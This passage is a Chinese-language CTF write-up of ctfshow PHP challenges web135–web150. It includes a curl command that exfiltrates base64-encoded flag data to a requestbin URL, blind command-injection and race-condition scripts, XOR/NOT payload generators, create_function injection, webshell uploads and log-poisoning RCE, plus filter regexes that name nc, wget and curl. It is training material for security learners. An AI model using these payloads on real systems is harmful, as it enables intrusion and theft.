将命令的输出重定向到 `1.txt` 文件中\n\n- `nl` 是一个命令，用于对文件内容进行行编号。即将文件的每一行进行编号输出。\n\n## 重命名\n?F=`$F `;mv flag.php 1.txt \n\n## 文件复制\n?F=`$F `;cp flag.php 1.txt\n\n## ping\n?F=`$F `;ping cat flag.php|awk 'NR==2'.服务器地址\n#通过ping命令去带出数据，然后awk NR一排一排的获得数据\n用 awk 命令选择第 2 行（flag 在多少行是需要不断尝试出来的）；\n```\n\n这里我用的cp命令，然后访问1.txt就可以看到flag了\n\n![image-20241118113036574](./../image/achieve/202411/php特性---ctfshow/image-20241118113036574.png)\n\n非预期\n\n或者也可以用符号进行绕过\n\n```\n\\\n'\n\"\n```\n\n姿势\n\n```\ncu\\rl https://requestbin.net/r/d6dln1sn?q=`ca\\t flag.php | gr\\ep flag1 | bas\\e64`\ncu\\rl https://requestbin.net/r/d6dln1sn?q=`ca\\t flag.php | gr\\ep flag2 | bas\\e64`\n```\n\n## web136\n\n### #考察exec函数以及使用tee命令写文件\n\n```php\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n### exec($c)\n\n在 PHP 中，`exec()` 函数用于执行外部程序。它可以将命令的输出捕获到一个数组变量中。\n\n举个例子\n\n```\n$output = [];\n$return_var = 0;\n$c = \"ls -la\";  // 这是一个简单的命令例子\nexec($c, $output, $return_var);\n\n// $output 会包含命令的输出\n// $return_var 会包含命令的返回状态码\n```\n\n- **参数**：\n  - `$c`：要执行的命令。\n  - `$output`：这是一个可选参数，用于捕获命令输出。\n  - `$return_var`：这是一个可选参数，用于捕获命令的返回状态码。\n\n其实我没怎么遇到过这个 exec 函数，尝试执行命令，发现页面是空白的\n\n![image-20241118115336240](./../image/achieve/202411/php特性---ctfshow/image-20241118115336240.png)\n\n这时候我们就得想到关于exec的用法了，我们需要将结果重定向到某个文件，然后再访问对应的文件\n\n因为>过滤，使用tee命令，可以变为另一个文件，类似>\n\npayload：\n\n?c=ls|tee 1 然后访问1发现只有一个index.php\n\n![image-20241118115831974](./../image/achieve/202411/php特性---ctfshow/image-20241118115831974.png)\n\n?c=ls /|tee 1 访问1下载查看文件\n\n![image-20241118115858748](./../image/achieve/202411/php特性---ctfshow/image-20241118115858748.png)\n\n ?c=cat /f149_15_h3r3|tee 1 访问下载查看文件1(2)就可以拿到flag了\n\n## web137\n\n### #考察call_user_func()函数的使用\n\nhttps://www.php.net/manual/zh/function.call-user-func.php\n\n```php\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\ncall_user_func($_POST['ctfshow']);\n```\n\n### call_user_func函数\n\ncall_user_func()用于调用用户定义的函数\n\n基本用法：\n\n```\n$result = call_user_func('function_name', $arg1, $arg2, ...);\n```\n\n- **`function_name`**：这是你想要调用的函数的名称，可以是字符串形式的函数名，也可以是匿名函数或其他可调用的结构。\n- **`$arg1, $arg2, ...`**：这是要传递给函数的参数，数量可变。\n\n举个例子\n\n```php\n<?php\nfunction barber($type)\n{\n    echo $type;\n}\ncall_user_func('barber', 'wanth3f1ag');\necho \"\\n\";\n$a=\"wanth3f1ag\";\ncall_user_func('barber',$a );\n#输出结果\n///wanth3f1ag\n///wanth3f1ag\n```\n\n那这里的话我们可以看到ctfsow类里面有跟flag有关的方法，所以我们需要调用类里面的方法\n\n#### 第一个方法:调用类里面的方法\n\n```\npayload:ctfshow=ctfshow::getFlag\n```\n\n双冒号可以不经过实例化调用类的方法\n\n或者也可以使用数组的方法进行调用\n\n#### 第二个方法：数组方式调用\n\n举个例子\n\n```php\n<?php\n\nclass myclass {\n    static function say_hello()\n    {\n        echo \"Hello!\\n\";\n    }\n}\n\n$classname = \"myclass\";\ncall_user_func(['myclass','say_hello']);\ncall_user_func(array($classname, 'say_hello'));\n///Hello!\n///Hello!\n```\n\n这里可以看到，当我们把classname设为myclass的时候，将其与say_hello放入数组中，此时这两个是键值对，call_user_func()会解析数组并进行静态方法的调用，这种数组的形式是 `[类名或对象, 方法名]`\n\n```\npayload:ctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n传进去之后查看源代码发现也是有flag的\n\n## web138\n\n### #考查strripos()函数的使用和绕过\n\nhttps://www.php.net/manual/zh/function.strripos.php\n\n```php\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\nif(strripos($_POST['ctfshow'], \":\")>-1){\n    die(\"private function\");\n}\n\ncall_user_func($_POST['ctfshow']);\n```\n\npayload:\n\n```\nctfshow[0]=ctfshow&ctfshow[1]=getFlag\n```\n\n其实这里的话就是用数组调用就可以了，但我们还是得学一下函数的哈\n\n### strripos()函数\n\n`strripos()` 是 PHP 中的一个字符串函数，用于查找字符串中一个子字符串最后一次出现的位置。与 `strrpos()` 类似，但 `strripos()` 是不区分大小写的\n\n基础语法\n\n```php\nstrripos(string $haystack, string $needle, int $offset = 0): int|false\n```\n\n### 参数\n\n- **`$haystack`**：要搜索的字符串。\n\n- **`$needle`**：要查找的子字符串。注意，如果 `$needle` 是一个空字符串，`strripos()` 会返回 `false`。\n\n- **`$offset`**（可选）：搜索的起始位置。如果为 0 或正数，则从左到右搜索，跳过 `haystack` 的开头 `offset` 个字节。\n\n  如果为负数，则从右向左执行搜索，跳过 `haystack` 的最后 `offset` 个字节并搜索首次出现的 `needle`。\n\n而题目中if(strripos($_POST['ctfshow'], \":\")>-1)因为字符串是从0开始，所以实际上就是把:给过滤掉了，我们尝试绕过:就行，所以用数组绕过\n\n## web139\n\n```php\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n又回到exec的题目了\n\n我们参考136的payload用tee命令，但是发现下载失败，应该是设置了权限\n\n后面搜寻了wp发现是用bash的if+sleep配合awk+cut进行盲打，直接摘脚本了\n\n先配合ls跑目录\n\n```python\nimport requests\nimport time\nimport string\n\nstr = string.ascii_letters + string.digits + \"-\" + \"{\" + \"}\" + \"_\" + \"~\"    # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加\nresult = \"\"          # 初始化一个空字符串，用于保存结果\n\n#获取多少行\nfor i in range(1, 99):\n    key = 0   #用于控制内层循环(j)的结束\n\n    #不break的情况下，一行最多几个字符\n    for j in range(1, 99):\n        if key == 1:\n            break\n        for n in str:       #n就是一个一个的返回值\n            #执行ls跑目录\n            payload = \"if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi\".format(i, j, n)   #{n}是占位符\n            #print(payload)\n            url = \"http://b43ed2e7-cdbe-47ec-937a-7288cc5c38a4.challenge.ctf.show/?c=\" + payload\n            try:\n                requests.get(url, timeout=(2.5, 2.5))   #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。\n\n            # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环\n            except:\n                result = result + n\n                print(result)\n                break\n            if n == '~':    #str的最后一位，“~”不常出现，用作结尾\n                key = 1\n    # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置\n    result += \" \"\n\n```\n\n![image-20241118153713464](./../image/achieve/202411/php特性---ctfshow/image-20241118153713464.png)\n\n拿flag\n\n```python\nimport requests\nimport time\nimport string\n\nstr = string.digits + string.ascii_lowercase + \"-\" + \"_\" + \"~\"# 题目过滤花括号，这里就不加了\nresult = \"\"\nfor j in range(1, 99):\n    for n in str:\n        #跑flag\n        payload = \"if [ `cat /f149_15_h3r3 |cut -c {0}` == {1} ];then sleep 3;fi\".format(j, n)\n        # print(payload)\n        url = \"http://b43ed2e7-cdbe-47ec-937a-7288cc5c38a4.challenge.ctf.show/?c=\" + payload\n        try:\n            requests.get(url, timeout=(2.5, 2.5))\n        except:\n            result = result + n\n            print(result)\n            break\n        if n==\"~\":\n            result = result + \"花括号\"\n#记得替换payload的flag文件名和url就行\n```\n\n## web140\n\n### #函数嵌套使用+弱类型比较+intval函数绕过\n\n```php\nif(isset($_POST['f1']) && isset($_POST['f2'])){\n    $f1 = (String)$_POST['f1'];\n    $f2 = (String)$_POST['f2'];\n    if(preg_match('/^[a-z0-9]+$/', $f1)){\n        if(preg_match('/^[a-z0-9]+$/', $f2)){\n            $code = eval(\"return $f1($f2());\");\n            if(intval($code) == 'ctfshow'){\n                echo file_get_contents(\"flag.php\");\n            }\n        }\n    }\n}\n```\n\nf1 f2 只能含有小写字母和数字\n\n对于intval函数前面有说过具体的用法和绕过方法，但是这里想要让if语句成立是比较困难的，所以我们应该看看如何能绕过里面的强比较去通过判断条件\n\n通过表格松散比较可以看到0和字符串比较结果为真，所以我们可以让intval处理后的返回值为0，这时候if语句就能为真\n\nintval会将非数字字符转换为0，也就是说 `intval('a')==0 intval('.')==0 intval('/')==0`\n\n然后我们看eval语句里面，f1和f2是函数嵌套使用，所以我们只要eval语句输出的结果是非数字字符就行\n\n所以这道题的payload是很多的\n\n```\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())   \n......\n```\n\npayload:\n\n```\nf1=usleep&f2=usleep\nf1=sleep&f2=sleep\nf1=md5&f2=phpinfo\nf1=md5&f2=md5\nf1=sha1&f2=getcwd\nf1=intval&f2=getcwd\nf1=getcwd&f2=getcwd\nf1=exec&f2=exec\nf1=system&f2=system\n```\n\n思路就是找到一个函数, 使它的返回值为空或者非数字字符, 这样intval 之后也会变成0\n\n## web141\n\n### #异或进行无数字字母rce+正则匹配/^\\W+$/\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/^\\W+$/', $v3)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n#### preg_match('/^\\W+$/', $v3)\n\n- **`^`**: 匹配字符串的开头。\n- 大写**`\\W`**: 表示匹配任何非单词字符。在正则表达式中，小写`\\w` 用于匹配字母、数字和下划线（即 `[a-zA-Z0-9_]`），而 大写`\\W` 则是其相反，匹配任何非字母、非数字、非下划线的字符，如空格、标点符号等。\n- **`+`**: 匹配前面的子模式一次或多次。因此，`\\W+` 会匹配一个或多个连续的非单词字符。\n- **`$`**: 匹配字符串的结尾。\n\n`'/^\\W+$/'` 的整体意思是：从字符串的开头到结尾都是由一个或多个非单词字符构成。\n\n非单词字符（`\\W`）包括：\n\n- 空白字符：空格、制表符、换行符等\n- 标点符号：如句号、逗号、感叹号、问号、引号等\n- 其他符号：如 `@`、`#`、`$`、`%`、`&`、`*`、`(`、`)`、`-`、`+` 等\n\n我们来做个测试\n\n```\n<?php\n$a='???';\n$b='abc';\nif(preg_match('/^\\W+$/',$a)){\n\techo \"1\";\n}\nif(preg_match('/^\\W+$/',$b)){\n\techo '2';\n}\n//输出结果:1\n```\n\n然后可以看到有eval语句\n\n所以这里的话属于是无字母构造payload进行rce了\n\n之前我有学过无字母数字的rce分别有三种方式，一种是自增一种是取反一种是异或\n\n我们来用异或进行构造payload，关于异或脚本的写法简单来说就是遍历字符表来异或，找到符合要求的记录下来，再输入想要的指令，在记录中遍历查找到 即可形成无数字字母的shell\n\n这里我拿了师傅的一个异或的脚本，算是比较通用的，后面我再具体学习写脚本\n\n#### 异或构造payload脚本\n\n```python\nimport re\n#异或无数字字母绕过\n#取得可用字符串放入文件\ndef get_xor_words():\n    preg='[a-zA-Z0-9]'\n    result=''\n    #遍历扩展ascii码表\n    for i in range(256):\n        for j in range(256):\n            if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):\n                k=i^j\n                #k在可显示字符中\n                if k>=32 and k<=126:\n                    # 以URL编码方式存储\n                    a = '%' + hex(i)[2:].zfill(2)\n                    b = '%' + hex(j)[2:].zfill(2)\n                    result += (chr(k) + ' ' + a + ' ' + b + '\\n')\n    f=open('xor_file.txt','w')\n    f.write(result)\n#通过输入的命令获取无数字字母命令\ndef get_order(arg):\n    s1 = \"\"\n    s2 = \"\"\n    for i in arg:\n        f = open(\"xor_file.txt\", \"r\")\n        while True:\n            t = f.readline()\n            if t == \"\":\n                break\n            if t[0] == i:\n                s1 += t[2:5]\n                s2 += t[6:9]\n                break\n        f.close()\n        #异或后存入\n    output = \"(\\\"\" + s1 + \"\\\"^\\\"\" + s2 + \"\\\")\"\n    return (output)\n\ndef main():\n    get_xor_words()\n    while True:\n        s1 = input(\"\\n[+] your function：\")\n        if s1 == \"exit\":\n            break\n        s2 = input(\"[+] your command：\")\n        param = get_order(s1) + get_order(s2)\n        print(\"\\n[*] result:\\n\" + param+\";\")\n\nmain()\n```\n\n![image-20241119111431567](./../image/achieve/202411/php特性---ctfshow/image-20241119111431567.png)\n\nv1和v2随便填，只要能通过第一层验证就行，然后v3就是我们的result，但注意的是这里有个return干扰，所以我们要在v3的payload前边和后面加上一些字符就可以执行命令，例如`\\+ - *` 等等\n\n![image-20241119112006494](./../image/achieve/202411/php特性---ctfshow/image-20241119112006494.png)\n\n![image-20241119112031105](./../image/achieve/202411/php特性---ctfshow/image-20241119112031105.png)\n\n换payload传进去就能拿到flag了\n\n## web142\n\n### #学习函数sleep\n\n```php\nif(isset($_GET['v1'])){\n    $v1 = (String)$_GET['v1'];\n    if(is_numeric($v1)){\n        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);\n        sleep($d);\n        echo file_get_contents(\"flag.php\");\n    }\n}\n```\n\n#### sleep($d)\n\n在 PHP 中，`sleep($d);` 用于将程序暂停执行一段时间，具体时间由变量 `$d` 所指定。这个函数会使脚本暂停 `$d` 秒。\n\n可以看到d参数是由(int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d)组成，而0x36d是877的意思，如果我们v1传入的是1的话d参数的值就特别大，我们得等到猴年马月，这里我们直接传0的各种进制数进去就行\n\npayload:v1=0\n\n这样的话d就等于0，就能很快出flag了，flag在源码里面\n\n## web143\n\n### #无字母无数字rce异或脚本2.0\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n这里的v3相对于141过滤了更多，但是我们的异或符号没有被过滤，可以正常使用141的脚本\n\n绕过方法：取反用异或代替，减号用乘或除代替。\n\n但是我们要把脚本里面的preg改成我们现在的过滤\n\n我这里再放一个脚本，这个异或脚本相对来说复制一点点但也很好用\n\n#### 无字母数字rce异或脚本\n\nphp脚本生成可用字符\n\n```php\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i'; //根据题目给的正则表达式修改即可\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n```\n\npython脚本\n\n```python\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n\n```\n\n最后的payload:\n\n```\nv3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*\n```\n\n## web144\n\n### #水题\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && check($v3)){\n        if(preg_match('/^\\W+$/', $v2)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n\nfunction check($str){\n    return strlen($str)===1?true:false;\n}\n```\n\n这道题的话就只是相对于141来说是换了变量的位置，让v2为我们需要处理的字符串，所以做法是一样的\n\n## web145\n\n### #三目运算符绕过正则匹配\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n这里没有过滤取反符号~,但是过滤了异或符号，那我们可以试一下取反\n\n取反脚本\n\n```php\n<?php\n//在命令行中运行\n\nfwrite(STDOUT,'[+]your function: ');\n\n$system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\nfwrite(STDOUT,'[+]your command: ');\n\n$command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\necho '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';\n```\n\n但是这里过滤了加减乘除反斜杠\n\n看了大佬的wp，我又学到了一种新方法，就是关于三目运算的构建payload\n\n羽师傅的测试:\n\n```php\neval(\"return 1?phpinfo():1;\");\n```\n\n本地测试结果是可以执行，那我们可以使用三目运算符\n\n所以我们的目标是构建`eval(\"return 1?tac f*:1;\");`\n\npayload构造类似之前：\n\n```\n?v1=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&v2=1     //三目运算符\n```\n\n## web146\n\n### #逻辑或绕过正则匹配\n\n```php\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n上面忘记放脚本了，这里放一个脚本\n\n#### 查看可用字符脚本\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i',chr($i))){\n            echo chr($i).\" \";\n        }\n}\n?>\n///' ( ) , = ? [ \\ ] ` { | ~ \n```\n\n这样的话可以用的字符就一目了然了\n\n这里可以看到三木运算符的:被禁用了，我们可以用逻辑或运算符试一下\n\n本地测试:\n\n```php\n<?php\neval(\"return 1|phpinfo()|die('world');\");\n?>\n```\n\n发现是可以跑的通的\n\n那就直接构造payload\n\n```\n?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1\n```\n\n## web147\n\n### #正则匹配/^[a-z0-9_]*$/isD\n\n### #考点：create_function函数注入\n\n```php\nif(isset($_POST['ctf'])){\n    $ctfshow = $_POST['ctf'];\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\n        $ctfshow('',$_GET['show']);\n    }\n\n}\n```\n\n#### preg_match('/^[a-z0-9_]*$/isD',$ctfshow)\n\n##### 正则表达式详解\n\n- **`^`**: 表示字符串的开始。\n- `[a-z0-9_]*:\n  - `[a-z0-9_]`: 这部分表示一个字符集合，匹配任意小写字母 (`a-z`)、数字 (`0-9`) 或下划线 (`_`)。\n  - `*`: 量词，表示前面的字符集合可以出现零次或多次。\n- **`$`**: 表示字符串的结束。\n\n##### 正则表达式修饰符\n\n- **`i`**: 忽略大小写。由于字符集合中只有小写字母，这个修饰符使得正则表达式同时也匹配大写字母。\n- **`s`**: 使得 `.` 可以匹配换行符，但在此正则表达式中没有使用 `.`，所以这个修饰符没有实际影响。\n- **`D`**: 表示 \"dollar end only\"，也就是说 `$` 只匹配字符串的结尾。这在某些情况下会影响匹配行为，但在这个具体正则中，`D` 修饰符没有特别的影响。\n\n输出可用字符:! \" # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \\ ] ^ ` { | } ~ \n\n关于create_function函数注入\n\n#### create_funtion函数\n\n`create_function` 是 PHP 中的一个函数，用于动态创建匿名函数\n\n基础语法\n\n```php\n$function = create_function('$args', 'code');\n```\n\n- `$args` 是一个用逗号分隔的参数列表。\n- `code` 是函数体的代码。\n\n由于php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法\n\ncreate_function()代码注入：\n\n```php\ncreate_function('$a',echo $a.\"123\"')\n就相当于\nfunction ($a){\n\techo $a.\"123\";\n\t}\n```\n\n我们来做个直观的代码方便观看\n\n```\nfuntion f($a){\n\techo 1;}phpinfo();\n}\n就是\nfunction f($a){\n\techo 1;\n}\nphpinfo();\n```\n\n但是这里原则上会多出一个}，这样该怎么处理呢?我们可用参考sql注入中的主动闭合+注释\n\npayload\n\n```\n?show=}system(\"tac f*\");/*     //GET\nctf=\\create_function           //POST\n```\n\n## web148\n\n### #中文变量绕过\n\n```php\ninclude 'flag.php';\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n    if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&\\*\\+\\- ]+/\",$code)){\n        die(\"error\");\n    }\n    @eval($code);\n}\nelse{\n    highlight_file(__FILE__);\n}\n\nfunction get_ctfshow_fl0g(){\n    echo file_get_contents(\"flag.php\");\n}\n```\n\n可以看到flag在get_ctfshow_flag()方法里面，只要调用了这个方法就能输出flag\n\n我们还可以看到eval函数，eval函数会将我们输入的code参数的值作为php代码执行，那我们看看能不能通过eval函数去调用get_ctfshow-flag()方法呢\n\n方法一就是正常的异或绕i过了，因为没过滤^符号\n\npayload:\n\n```\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%02\"^\"%7d%60%60%21%60%28\");\n```\n\n![image-20241119161418545](./../image/achieve/202411/php特性---ctfshow/image-20241119161418545.png)\n\n方法二:中文变量绕过\n\n```php\n?code=$给特=\"%60%7B%7B%7B\"%5E\"?<>/\";${$给特}[参数一](${$给特}[参数二]);&参数一=system&参数二=tac%20f*\n\n//?code=$给特=\"`{{{\"^\"?<>/\";${$给特}[参数一](${$给特}[参数二]);&参数一=system&参数二=tac f*\n//\"`{{{\"^\"?<>/\"; 异或出来的结果是 _GET\n//也可以    ${_GET}[哼](${_GET}[嗯]);&哼=call_user_func&嗯=get_ctfshow_fl0g\n```\n\n## web149\n\n### #删除文件的条件竞争\n\n```php\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n\nfile_put_contents($_GET['ctf'], $_POST['show']);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n```\n\n这里进行了一个扫描目录的操作，并根据条件执行删除文件的指令\n\n1. **`scandir('./')`**:\n   - `scandir` 函数用于扫描指定目录，返回文件和子目录的列表。\n   - `'./'` 表示当前目录。\n2. **`unlink($file)`**:\n   - `unlink` 函数用于删除文件\n\n#### 非预期\n\n因为不会删除index.php，所以我这里有想到一个非预期解，就是往index.php里面写一句话\n\n![image-20241119162822769](./../image/achieve/202411/php特性---ctfshow/image-20241119162822769.png)\n\n然后用蚁剑连接木马就可以了\n\n#### 预期解:条件竞争进行访问\n\n用脚本进行条件竞争\n\n```python\nimport requests  # 导入requests库，用于发送HTTP请求。  \nimport io  # 导入io库，用于处理输入输出流，这里主要用于创建字节流。  \nimport threading  # 导入threading库，用于实现多线程。  \n  \n# 定义目标URL和会话ID。  \nurl='http://db1dc1a9-61c8-4e0b-94df-e0525c7f9192.challenge.ctf.show/'  # 目标网站的URL。    \n  \n# 构造要发送的数据，尝试在服务器上写入一句话木马。  \n\n  \n# 定义write函数，用于通过发送大量文件上传请求来尝试写入木马文件。  \ndef write():\n    while event.isSet():\n        data = {\n            'show': '<?php system(\"cat /ctfshow_fl0g_here.txt\");?>'\n        }\n        requests.post(url=url+'?ctf=1.php', data=data)\n\n\ndef read():\n    while event.isSet():\n        response = requests.get(url + '1.php')\n        if response.status_code != 404:\n            print(response.text)\n            event.clear()\n\n\nif __name__ == \"__main__\":\n    event = threading.Event()\n    event.set()\n    for i in range(1, 100):\n        threading.Thread(target=write).start()\n\n    for i in range(1, 100):\n        threading.Thread(target=read).start()\n```\n\n## web150\n\n### #文件包含非预期绕过\n\n```php\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];//获取查询字符串\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);//将 $_GET 数组中的键值对提取出来，并将键作为变量名\nif(class_exists($__CTFSHOW__)){\t// 如果指定类(CTFSHOW)存在，则输出提示信息\n    echo \"class is exists!\";\n}\n// 如果 $isVIP 为真且 ctf 字符串中不包含冒号\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n}\n```\n\n这里首先看到的是include函数，第一时间想到的是文件包含，然后我们去看过滤，这里会对get传入的参数进行key的过滤，这里有一个isVIP参数和ctf参数，后者是通过post传参但前者似乎没有定义传参方式，那我们就get传就行，这样的话我们采用日志注入来做试试\n\n为什么使用日志注入?\n\n因为$key进行了字符的过滤，所以我们不能通过get传参传入木马,正常的文件包含行不通，所以我们需要进行日志文件包含或者session文件包含\n\n### 日志注入\n\n先看服务器\n\n![image-20241119170818864](./../image/achieve/202411/php特性---ctfshow/image-20241119170818864.png)\n\n是nginx服务器，\n\n日志文件路径：\n\n```\napache一般是/var/log/apache/access.log。\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log。\n```\n\n 然后我们进行抓包，并往ua头写入一句话木马\n\nUA头：`<?php eval($_POST[1]);?>`\n\n![image-20241119170916708](./../image/achieve/202411/php特性---ctfshow/image-20241119170916708.png)\n\n包含日志文件，进行RCE\n\n?isVIP=true                                         //GET\nctf=/var/log/nginx/access.log&1=system(\"tac flag.php\");   //POST\n\n![image-20241119171251145](./../image/achieve/202411/php特性---ctfshow/image-20241119171251145.png)\n\n这里的话用session文件包含也是可以的，大家都可以试一下\n\n## web150_plus\n\n```php\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    